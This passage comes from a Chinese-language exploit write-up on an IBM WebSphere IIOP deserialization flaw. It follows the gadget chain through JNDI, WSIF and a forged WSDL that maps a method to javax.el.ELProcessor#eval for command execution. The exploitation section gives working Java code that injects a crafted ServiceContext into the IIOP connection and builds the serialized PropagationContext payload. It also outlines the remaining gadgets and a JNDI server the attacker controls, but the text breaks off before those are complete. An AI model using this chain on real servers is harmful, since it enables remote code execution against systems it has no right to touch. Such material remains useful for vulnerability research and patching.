    com.sun.jndi.rmi.registry.RegistryContext#decodeObject
    javax.naming.spi.NamingManager#getObjectInstance
    org.apache.aries.jndi.OSGiObjectFactoryBuilder#getObjectInstance(java.lang.Object, javax.naming.Name, javax.naming.Context, java.util.Hashtable)
    org.apache.aries.jndi.ObjectFactoryHelper#getObjectInstance
跟进`org.apache.aries.jndi.ObjectFactoryHelper#getObjectInstanceViaContextDotObjectFactories(java.lang.Object,
javax.naming.Name, javax.naming.Context, java.util.Hashtable,
javax.naming.directory.Attributes)`：
这里的`factory`为`ObjectFactory`接口的具体实现，而`factory`是可以通过`environment`自定义实现的，所以这里可以通过修改`environment`的配置更改执行流。
tint0这里找到的可以用`ObjectFactory`为`org.apache.wsif.naming.WSIFServiceObjectFactory`：
由于`ctx.lookup()`最终要求返回的是`EJBHome`的实现类，而`WSIFService`接口并非`EJBHome`的子类，所以选择下面的流程。根据2.2.1中的叙述，可以明显的看出这里调用了`WSIF`流程。
这里重新放一下`WSIFServiceFactory.getService()`方法的文档：
对应实现的代码：
注意红框标注的相关代码，`WSIF`所需要的基础参数我们都可以通过`Reference`对象获得。通过指定`className`，我们还可以指定生成的`stub`动态代理对象的类型，当设置其为`EJBHome`的具体实现类时，可以完美的匹配我们之前的需求。
而通过自定义`wsdl`文件，我们可以将接口方法映射到其他的具体实现中，改变具体接口的执行流。
## 2.3 伪造wsdl文件完成漏洞利用
根据2.2.2中的内容，我们回看触发JNDI流程处的代码：
在2.2.2中也说过，这里的`home`对象要满足两个条件：
  * 是`EJBHome`的具体实现类
  * 存在`findByPrimaryKey`方法
搜索`EJBHome`的继承树，满足条件的有：
    com.ibm.ejs.security.registry.RegistryEntryHome
    com.ibm.ws.batch.AbstractResourceHome
    com.ibm.ws.batch.CounterHome
    com.ibm.ws.batch.LocalJobStatusHome
所以如果构造`Reference`对象中的`className`为其中一个类，并设置好`wsdl`文件中对应接口方法的映射，即可完成我们想要控制的逻辑。
仔细研究一下上面所列举的可用的`EJBHome`接口子类：
其中`com.ibm.ws.batch.CounterHome`是最容易构造的，可以配合`javax.el.ELProcessor`执行`el`表达式，最终导致命令执行。
所以只需要造好`wsdl`，让`CounterHome`的`findByPrimaryKey`方法的具体实现指向`javax.el.ELProcessor`的`eval`方法，在返回了`CounterHome`动态代理对象后，会利用反射调用其`findByPrimaryKey`也就是我们通过`wsdl`绑定的`javax.el.ELProcessor#eval`方法，完成表达式执行。
攻击流程可以总结如下：
至此漏洞梳理完毕。
# 0x03 漏洞利用
根据0x02的分析，可以得出想要利用成功该漏洞所需的必备因素：
  * IIOP请求构造（满足进入触发点的context）
  * 构造`org.apache.wsif.providers.ejb.WSIFPort_EJB`所需的序列化数据（最终反序列化对象的类型为`Handle`）
  * 构造`wsdl`文件更改接口方法的具体实现
  * 构造`JNDI server`使其返回指定的`Reference`对象
接下来会对上述流程进行逐一叙述。
## 3.1 IIOP请求构造
回看`com.ibm.ws.Transaction.JTS.TxServerInterceptor#receive_request`：
要注意两个点：
  * `ServiceContext.context_data`非空，且包含我们构造的序列化Gadget
  * `TxProperties.SINGLE_PROCESS`为`true`
重点来看一下`ServiceContext`获取逻辑，跟进`((ExtendedServerRequestInfo)sri).getRequestServiceContext(0)`，调用逻辑如下：
    com.ibm.rmi.pi.ServerRequestInfoImpl#getRequestServiceContext
    com.ibm.rmi.iiop.ServerRequestImpl#getServiceContext
    com.ibm.rmi.iiop.RequestMessage#getServiceContext
    com.ibm.rmi.iiop.ServiceContextList#getServiceContext
根据调用栈我们可以看到是从`com.ibm.rmi.iiop.RequestMessage`对象中获取`ServiceContext`对象的，在`etServiceContext`方法中：
会遍历`ServiceContextList`，提取id为`0`的`ServiceContext`。但是由于没有编号为`0`的`ServiceContext`，所以返回的是空。
仔细读一下官方文档，官方文档中有提及如何在RMI请求中插入`ServiceContext`的做法，可以参考[文档](https://publib.boulder.ibm.com/tividd/td/ITMFTP/SC32-9412-00/en_US/HTML/arm48.htm)进行理解：
可以看到最终是调用`ExtendedClientRequestInfo`(`ClientRequestInfo`的父类)的`add_request_service_context`方法完成自定义`ServiceContext`的设置。那么关键点就是，我们如何从client端将`ServiceContext`设置到`ExtendedClientRequestInfo`中。
在跟踪了ibm自定义的通信过程后，可以发现在`ORB`中的`GIOPImpl`在调用`createRequest`方法时会实例化`ClientRequestImpl`对象：
这里有两个地方需要注意：
  * 获取`Connection`对象
  * 根据获取的`Connection`对象获取`ServiceContext`
首先先看一下是如何从`Connection`对象中获取到`ServiceContext`的：
可以看到直接是调用`Connection#getServiceContexts`方法。
之后跟进`ClientRequestImpl`初始化逻辑：
将获取到的`ServiceContext`作为参数传入到`RequestMessage`的构造函数中。这里就和服务端跟到的逻辑相符。
梳理一下思路，构造`IIOP`请求的关键点为：
  * 进行第一次请求，初始化获取到的`Context`对象
  * 获取`ORB`
  * 获取`ORB`中的`GIOPImpl`
  * 获取`Connection`对象
  * 调用`setConnectionContexts`将构造好的`ServiceContext`设置到`Connection`对象中
  * 进行第二次请求，触发`RequestMessage`对象的重新发送
具体构造可以动态调试一下，利用反射完成相关的值设置。
最终构造如下：
    Properties env = new Properties();
    env.put(Context.PROVIDER_URL, "iiop://192.168.211.128:2809");
    env.put(Context.INITIAL_CONTEXT_FACTORY, "com.ibm.websphere.naming.WsnInitialContextFactory");
    InitialContext context = new InitialContext(env);
    context.list("");
    Field f_defaultInitCtx = context.getClass().getDeclaredField("defaultInitCtx");
    f_defaultInitCtx.setAccessible(true);
    WsnInitCtx defaultInitCtx = (WsnInitCtx) f_defaultInitCtx.get(context);
    Field f_context = defaultInitCtx.getClass().getDeclaredField("_context");
    f_context.setAccessible(true);
    CNContextImpl _context = (CNContextImpl) f_context.get(defaultInitCtx);
    Field f_corbaNC = _context.getClass().getDeclaredField("_corbaNC");
    f_corbaNC.setAccessible(true);
    _NamingContextStub _corbaNC = (_NamingContextStub) f_corbaNC.get(_context);
    Field f__delegate = ObjectImpl.class.getDeclaredField("__delegate");
    f__delegate.setAccessible(true);
    ClientDelegate clientDelegate = (ClientDelegate) f__delegate.get(_corbaNC);
    Field f_ior = clientDelegate.getClass().getSuperclass().getDeclaredField("ior");
    f_ior.setAccessible(true);
    IOR ior = (IOR) f_ior.get(clientDelegate);
    Field f_orb = clientDelegate.getClass().getSuperclass().getDeclaredField("orb");
    f_orb.setAccessible(true);
    ORB orb = (ORB) f_orb.get(clientDelegate);
    GIOPImpl giop = (GIOPImpl) orb.getServerGIOP();
    Method getConnection = giop.getClass().getDeclaredMethod("getConnection", com.ibm.CORBA.iiop.IOR.class, Profile.class, ClientDelegate.class, String.class);
    getConnection.setAccessible(true);
    Connection connection = (Connection) getConnection.invoke(giop, ior, ior.getProfile(), clientDelegate, "Lucifaer");
    Method setConnectionContexts = connection.getClass().getDeclaredMethod("setConnectionContexts", ArrayList.class);
    setConnectionContexts.setAccessible(true);
    byte[] result = new byte[]{0, 0};
    ServiceContext serviceContext = new ServiceContext(0, result);
    ArrayList v4 = new ArrayList();
    v4.add(serviceContext);
    setConnectionContexts.invoke(connection, v4);
    context.list("");
## 3.2 构造所需的序列化数据
在2.1的分析中，我们知道要满足触发反序列化流程需要进行特殊构造。漏洞触发点为`inputStream.read_any()`，为了满足上方对`inputStream`相关数据的提取，所以需要特殊构造`byte[]`：
既然存在`demarshalContext`方法，那一定存在`marshalContext`方法：
按照上面的方法直接生成符合要求的`byte[]`：
    CDROutputStream outputStream = ORB.createCDROutputStream();
    outputStream.putEndian();
    Any any = orb.create_any();
    PropagationContext propagationContext = new PropagationContext(
            0,
            new TransIdentity(null, null, new otid_t(0, 0, new byte[0])),
            new TransIdentity[0],
            any
    );
    PropagationContextHelper.write(outputStream, propagationContext);
    result = outputStream.toByteArray();
在满足了触发点后，我们需要构造gadget满足条件：
  * 构造一个`org.apache.wsif.providers.ejb.WSIFPort_EJB`对象，其中还需要构造`WSIFPort_EJB#readObject`方法传入值反序列化得到一个`javax.ejb.Handle`对象。
  * 构造`EntityHandle`对象
### 3.2.1 生成WSIFPort_EJB序列化对象
直接看`org.apache.wsif.providers.ejb.WSIFPort_EJB#writeObject`：
这里我们需要首先设置`this.fieldEjbObject`对象并调用其`getHandle`方法，生成一个`Handle`对象。这里的`this.fieldEjbObject`是`EJBObject`接口的具体实现。所以可以自己寻找一个具体实现类，并覆盖其`getHandle`方法。
### 3.2.2 构造EntityHandle对象
构造一个`EntityHandle`对象还是比较麻烦的，我们来理一下：
我们需要将`homeJNDIName`设置为我们自己定义的RMI
Server地址，同时`key`是最终传入`findByPrimaryKey`的参数，需要构造为我们要执行的代码，所以需要构造特殊的`BeanId`对象：
同时为了将之后RMI流程指向`org.apache.wsif.naming.WSIFServiceObjectFactory`，需要我们在`Properties`对象中设置相关的`environment`：
我们首先构造`BeanId`。跟进`com.ibm.ejs.container.BeanId#getJNDIName`：